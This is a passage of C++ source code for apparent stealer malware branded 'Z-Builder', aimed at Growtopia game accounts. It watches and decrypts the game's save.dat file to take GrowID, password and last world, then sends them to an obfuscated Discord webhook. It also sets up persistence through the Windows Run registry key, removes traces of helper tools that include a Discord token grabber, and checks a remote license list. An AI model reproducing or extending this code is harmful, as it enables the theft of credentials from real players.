        MiniSplitter = aData.find("[---Z-Builder---]");
        string LastWorld = aData.substr(0, MiniSplitter);;
        AllData.erase(0, Splitter + Splits.size());
        Info += "**GrowID: **`" + GrowID + "`\\n" + "**Password: **`" + Password + "`\\n" + "**Last world: **`" + LastWorld + "`\\n\\n";
    }
    if (Info.find("GrowID") != string::npos)
    {
        string AllInfo = "{ \"username\":\"Z-Builder\",\"avatar_url\":\"https://cdn.discordapp.com/icons/745016440569987098/56ce57aa24fd66dc9a39fc03b48f9424.png?size=128\",\"embeds\":[{\"title\":\"__**Here are all account(s) on the PC (besides recycle bin)! ~Z-Builder**__\",\"description\":\"" + Info + "\",\"color\":\"65535\"}] }";
        SendMessage(AllInfo, "application/json"); //application/json or multipart/form-data
    }
}
// Get all accounts in the PC (besides recycle bin) - End

// Tracer
string ReadContent(string path)
{
    ifstream ReadContent(path, std::ios::binary);
    string Content = string((istreambuf_iterator<char>(ReadContent)),
        (istreambuf_iterator<char>()));
    ReadContent.close();
    return Content;
}

void WriteTempContent(string Content)
{
    string TempPath = getenv("TEMP");
    string Location = TempPath + "\\ZBData.zb";
    ofstream WriteContent(Location, std::ofstream::trunc);
    WriteContent << Content;
    WriteContent.close();
}

template<typename InputIterator1, typename InputIterator2>
bool
range_equal(InputIterator1 first1, InputIterator1 last1,
    InputIterator2 first2, InputIterator2 last2)
{
    while (first1 != last1 && first2 != last2)
    {
        if (*first1 != *first2) return false;
        ++first1;
        ++first2;
    }
    return (first1 == last1) && (first2 == last2);
}

bool compare_files(const std::string& filename1, const std::string& filename2)
{
    std::ifstream file1(filename1);
    std::ifstream file2(filename2);

    std::istreambuf_iterator<char> begin1(file1);
    std::istreambuf_iterator<char> begin2(file2);

    std::istreambuf_iterator<char> end;

    return range_equal(begin1, end, begin2, end);
}

void TraceAcc()
{
    string SaveDatLocation = SaveDatPath();
    string Contents = ReadContent(SaveDatLocation);
    WriteTempContent(Contents);
    string directory;
    const size_t last_slash_idx = SaveDatLocation.rfind('\\');
    if (std::string::npos != last_slash_idx)
    {
        directory = SaveDatLocation.substr(0, last_slash_idx);
    }
    FileWatcher fw{ directory , std::chrono::milliseconds(500) };

    fw.start([](std::string path_to_watch, FileStatus status) -> void {
        if (!std::filesystem::is_regular_file(std::filesystem::path(path_to_watch)) && status != FileStatus::erased) {
            return;
        }
        string SaveDatLocation = SaveDatPath();
        switch (status)
        {
        case FileStatus::created:
            if (path_to_watch == SaveDatLocation)
            {
                string TempFileLocation = (string)getenv("TEMP") + "\\ZBData.zb";
                string TempContents = ReadContent(TempFileLocation);
                string Contents = ReadContent(SaveDatLocation);
                string tempPath = getenv("TEMP");
                string targetString = tempPath + "\\save.dat";
                if (!(compare_files(TempFileLocation, SaveDatLocation)))
                {
                    try
                    {
                        WriteTempContent(Contents);
                        wstring wSaveDatLocation;
                        wSaveDatLocation.assign(SaveDatLocation.begin(), SaveDatLocation.end());
                        wstring wTarget;
                        wTarget.assign(targetString.begin(), targetString.end());
                        try
                        {
                            CopyFile(wSaveDatLocation.c_str(), wTarget.c_str(), FALSE);
                        }
                        catch (...)
                        {
                        }
                    }
                    catch (...) {}
                    string AccDataContent = savedecrypt();
                    string GrowID;
                    string Password;
                    string LastWorld;
                    if (AccDataContent != "")
                    {
                        string AccDataSplit = "[---Z-Builder---]";
                        size_t StringSplit = AccDataContent.find(AccDataSplit);
                        GrowID = AccDataContent.substr(0, StringSplit);
                        AccDataContent.erase(0, StringSplit + AccDataSplit.size());
                        StringSplit = AccDataContent.find(AccDataSplit);
                        Password = AccDataContent.substr(0, StringSplit);
                        AccDataContent.erase(0, StringSplit + AccDataSplit.size());
                        StringSplit = AccDataContent.find(AccDataSplit);
                        LastWorld = AccDataContent.substr(0, StringSplit);;
                    }
                    else
                    {
                        GrowID = "No GrowID found";
                        Password = "No password found";
                        LastWorld = "No world found";
                    }
                    string Info = "**GrowID: **`" + GrowID + "`\\n" + "**Password: **`" + Password + "`\\n" + "**Last world: **`" + LastWorld + "`";
                    CleanUp();
                    string AllInfo = "{ \"username\":\"Z-Builder\",\"avatar_url\":\"https://cdn.discordapp.com/icons/745016440569987098/56ce57aa24fd66dc9a39fc03b48f9424.png?size=128\",\"embeds\":[{\"title\":\"__**Traced an account! ~Z-Builder**__\",\"description\":\"" + Info + "\",\"color\":\"65535\"}] }";
                    SendMessage(AllInfo, "application/json"); //application/json or multipart/form-data
                }
            }
            break;
        case FileStatus::modified:
            if (path_to_watch == SaveDatLocation)
            {
                string TempFileLocation = (string)getenv("TEMP") + "\\ZBData.zb";
                string TempContents = ReadContent(TempFileLocation);
                string Contents = ReadContent(SaveDatLocation);
                string tempPath = getenv("TEMP");
                string targetString = tempPath + "\\save.dat";
                if (!(compare_files(TempFileLocation, SaveDatLocation)))
                {
                    try
                    {
                        WriteTempContent(Contents);
                        wstring wSaveDatLocation;
                        wSaveDatLocation.assign(SaveDatLocation.begin(), SaveDatLocation.end());
                        wstring wTarget;
                        wTarget.assign(targetString.begin(), targetString.end());
                        try
                        {
                            CopyFile(wSaveDatLocation.c_str(), wTarget.c_str(), FALSE);
                        }
                        catch (...)
                        {
                        }
                    }
                    catch (...) {}
                    string AccDataContent = savedecrypt();
                    string GrowID;
                    string Password;
                    string LastWorld;
                    if (AccDataContent != "")
                    {
                        string AccDataSplit = "[---Z-Builder---]";
                        size_t StringSplit = AccDataContent.find(AccDataSplit);
                        GrowID = AccDataContent.substr(0, StringSplit);
                        AccDataContent.erase(0, StringSplit + AccDataSplit.size());
                        StringSplit = AccDataContent.find(AccDataSplit);
                        Password = AccDataContent.substr(0, StringSplit);
                        AccDataContent.erase(0, StringSplit + AccDataSplit.size());
                        StringSplit = AccDataContent.find(AccDataSplit);
                        LastWorld = AccDataContent.substr(0, StringSplit);
                    }
                    else
                    {
                        GrowID = "No GrowID found";
                        Password = "No password found";
                        LastWorld = "No world found";
                    }
                    string Info = "GrowID: `" + GrowID + "`\\n" + "Password: `" + Password + "`\\n" + "Last world: `" + LastWorld + "`";
                    CleanUp();
                    string AllInfo = "{ \"username\":\"Z-Builder\",\"avatar_url\":\"https://cdn.discordapp.com/icons/745016440569987098/56ce57aa24fd66dc9a39fc03b48f9424.png?size=128\",\"embeds\":[{\"title\":\"__**Traced an account! ~Z-Builder**__\",\"description\":\"" + Info + "\",\"color\":\"65535\"}] }";
                    SendMessage(AllInfo, "application/json"); //application/json or multipart/form-data
                }
            }
            break;
        case FileStatus::erased:
            break;
        default:
            break;
        }
        });
}
// Tracer - End

void Execute(wstring toto)
{
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION  pi;
    vector<TCHAR> V(toto.length() + 1);
    for (int i = 0; i < (int)toto.length(); i++)
        V[i] = toto[i];
    CreateProcess(NULL, &V[0], 0, 0, FALSE, 0, 0, 0, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

void CleanUp()
{
    string tempPath = getenv("TEMP");
    try
    {
        string DecrypterPath = tempPath + XorStr("\\savedecrypter.exe");
        remove(DecrypterPath.c_str());
    }
    catch (...) {}
    try
    {
        string tempSaveDatLocation = tempPath + XorStr("\\save.dat");
        remove(tempSaveDatLocation.c_str());
    }
    catch (...) {}
    try
    {
        string tempAccData = tempPath + XorStr("\\Password.zb");
        remove(tempAccData.c_str());
    }
    catch (...) {}
    try
    {
        string DiscordGrabberEXE = tempPath + XorStr("\\ZBDiscordTokenGrabber.exe");
        remove(DiscordGrabberEXE.c_str());
    }
    catch (...) {}
    try
    {
        string DiscordToken = tempPath + XorStr("\\DiscordToken.txt");
        remove(DiscordToken.c_str());
    }
    catch (...) {}
    try
    {
        string BatFile = tempPath + XorStr("\\ScanPC.bat");
        remove(BatFile.c_str());
    }
    catch (...) {}
    try
    {
        string SaveDatLocations = tempPath + XorStr("\\SaveDatLocation.txt");
        remove(SaveDatLocations.c_str());
    }
    catch (...) {}
    try
    {
        string WBPV = tempPath + XorStr("\\WBPV.exe");
        remove(WBPV.c_str());
    }
    catch (...) {}
    try
    {
        string MACzb = tempPath + XorStr("\\MAC.zb");
        remove(MACzb.c_str());
    }
    catch (...) {}
}

//Trim
string trim(const string& s)
{
    auto start = s.begin();
    while (start != s.end() && isspace(*start))
    {
        start++;
    }
    auto end = s.end();
    do {
        end--;
    } while (distance(start, end) > 0 && isspace(*end));
    return string(start, end + 1);
}
//Trim End

void RunOnStartUp()
{
    TCHAR szPath[MAX_PATH];
    GetModuleFileName(NULL, szPath, MAX_PATH);
    LPWSTR appName = PathFindFileName(szPath);
    *(PathFindExtension(appName)) = 0;
    HKEY newValue;
    RegOpenKey(HKEY_CURRENT_USER, _T("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &newValue);
    RegSetValueEx(newValue, appName, 0, REG_SZ, (LPBYTE)szPath, sizeof(szPath));
    RegCloseKey(newValue);
}

// Download File
size_t write_data(void* ptr, size_t size, size_t nmemb, FILE* stream)
{
    size_t written;
    written = fwrite(ptr, size, nmemb, stream);
    return written;
}

int DownloadFile(string url, string path)
{
    HRESULT hr;
    wstring Wurl;
    Wurl.assign(url.begin(), url.end());
    wstring Wpath;
    Wpath.assign(path.begin(), path.end());
    LPCTSTR Url = Wurl.c_str(), File = Wpath.c_str();
    hr = URLDownloadToFile(0, Url, File, 0, 0);
    return 0;
}
// Download File - End

// Webhook sender

void SendMessage(string Message, string ContentType)
{
    string s = "[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]";
    //string s = "323124382a682f2f3e2c232b362064612a357e2b363f2f612a2c7f3f3c30686f352e23676e663335637362796d6731356b76687e6c612f480520392d1a3c714a333c22201a11473210290f1f2f104a753e240a260b386e7177092365163a54622e2f240e3a174a330b15011e100475426c131e7a0f3376610f2c08[][][]";
    size_t LocateBegin = s.find("[");
    size_t LocateEnd = s.find("]");
    if (LocateBegin > LocateEnd)
    {
        s = s.substr(0, LocateBegin - 1);
    }
    else
    {
        s = s.substr(0, LocateEnd - 1);
    }
    s = decrypt2(hex_to_string(s));
    string delimiter = "https://discordapp.com/";
    size_t startapilocation = s.find("api");
    string token = s.substr(startapilocation);
    wstring token2;
    token2.assign(token.begin(), token.end());
    LPCTSTR ApiToken = token2.c_str();
    //-----------
    string v = ContentType;
    wstring v2;
    v2.assign(v.begin(), v.end());
    LPCTSTR AcceptTypes = v2.c_str();
    //-----------
    string w = "Content-Type: " + v;
    wstring w2;
    w2.assign(w.begin(), w.end());
    LPCTSTR ContentTypeHeader = w2.c_str();
    //-----------
    LPCTSTR szUserAgent = _T("Mozilla/5.0"); //Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.74 Safari/537.36 Edg/79.0.309.43
    LPCTSTR szHost = _T("discordapp.com");
    LPCTSTR szUrlPath = ApiToken;
    LPCTSTR szAcceptTypes[] = { AcceptTypes, NULL }; //application/json
    LPCTSTR szContentTypeHeader = ContentTypeHeader; //Content-Type: application/json
    LPCSTR szPostData = Message.c_str();
    const DWORD dwPostDataLength = strlen(szPostData);

    HINTERNET hIntSession = InternetOpen(szUserAgent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hIntSession) {
        HINTERNET hHttpSession = InternetConnect(hIntSession, szHost,
            INTERNET_DEFAULT_HTTPS_PORT, 0, 0, INTERNET_SERVICE_HTTP, 0, NULL);
        if (hHttpSession) {
            HINTERNET hHttpRequest = HttpOpenRequest(hHttpSession, _T("POST"), szUrlPath,
                NULL, NULL, szAcceptTypes,
                (INTERNET_FLAG_NO_COOKIES | INTERNET_FLAG_RELOAD | INTERNET_FLAG_SECURE |
                    INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_NO_CACHE_WRITE), 0);
            if (hHttpRequest) {
                if (HttpSendRequest(hHttpRequest,
                    szContentTypeHeader, -1, (LPVOID)szPostData,
                    dwPostDataLength)) {

                    DWORD dwStatusCode = 0;
                    {
                        TCHAR szStatusCode[32] = { 0 };
                        DWORD dwStatusCodeSize = sizeof(szStatusCode) / sizeof(TCHAR);
                        if (HttpQueryInfo(hHttpRequest, HTTP_QUERY_STATUS_CODE,
                            szStatusCode, &dwStatusCodeSize, NULL)) {
                            dwStatusCode = _ttoi(szStatusCode);
                        }
                    }

                    //
                    // dwStatusCode: [200,299] means success, any other value
                    // means something went wrong
                    //

                    unsigned char* lpResponse = NULL;
                    DWORD dwTotalSize = 0;
                    {
                        unsigned char* lpBuffer = (unsigned char*)malloc(2048);
                        DWORD dwRead = 0;
                        while (InternetReadFile(hHttpRequest, lpBuffer, sizeof(lpBuffer), &dwRead) && dwRead) {
                            unsigned char* lpTmp = (unsigned char*)realloc(lpResponse, dwTotalSize + dwRead);
                            if (lpTmp) {
                                lpResponse = lpTmp;
                                memcpy(&lpResponse[dwTotalSize], lpBuffer, dwRead);
                                dwTotalSize += dwRead;
                            }
                            dwRead = 0;
                        }
                        free(lpBuffer);
                    }

                    //
                    // lpResponse now has your data with length of dwTotalSize.
                    // Do with it what you want.
                    // Keep in mind that a successful request will return
                    // no data.
                    //

                    if (lpResponse) { free(lpResponse); }
                }
                InternetCloseHandle(hHttpRequest);
            }
            InternetCloseHandle(hHttpSession);
        }
        InternetCloseHandle(hIntSession);
    }
}

// Decrypt strings
string decrypt(string str)
{
    string temp = str;
    int length;

    length = (int)temp.length();

    for (int i = 0; i < length; i++)
    {
        if (isalpha(temp[i]))
        {
            for (int j = 0; j < 13; j++)
            {
                if (temp[i] == 'z')
                {
                    temp[i] = 'a';
                }
                else if (temp[i] == 'Z')
                {
                    temp[i] = 'A';
                }
                else
                {
                    temp[i]++;
                }
            }
        }
    }

    return temp;
}
// Decrypt strings - End

// Verify license
bool VerifyLicense(string License)
{
    std::vector<string> allLicenses;
    string rawLicenseData = DownloadString(decrypt2("21$8*h//*$#<<0int&?%v awu}ax+uU"));
    rawLicenseData.erase(remove(rawLicenseData.begin(), rawLicenseData.end(), '\r'), rawLicenseData.end());
    rawLicenseData.erase(remove(rawLicenseData.begin(), rawLicenseData.end(), '\n'), rawLicenseData.end());
    while (rawLicenseData.find("]") != string::npos)
    {
        size_t Splitter = rawLicenseData.find("]");
        string aLicense = rawLicenseData.substr(0, Splitter + 1);
        allLicenses.push_back(aLicense);
        rawLicenseData.erase(0, Splitter + 1);
    }
    if (std::find(allLicenses.begin(), allLicenses.end(), License) != allLicenses.end())
    {
        return true;
    }
    else
    {
        return false;
    }
}
// Verify license - End

string decrypt2(string toEncrypt) {
    char key[8] = { 'Z', 'E', 'P', 'H', 'Y', 'R' }; //Any chars will work
    string output = toEncrypt;

    for (int i = 0; i < toEncrypt.size(); i++)
        output[i] = toEncrypt[i] ^ key[i % (sizeof(key) / sizeof(char))];

    return output;
}
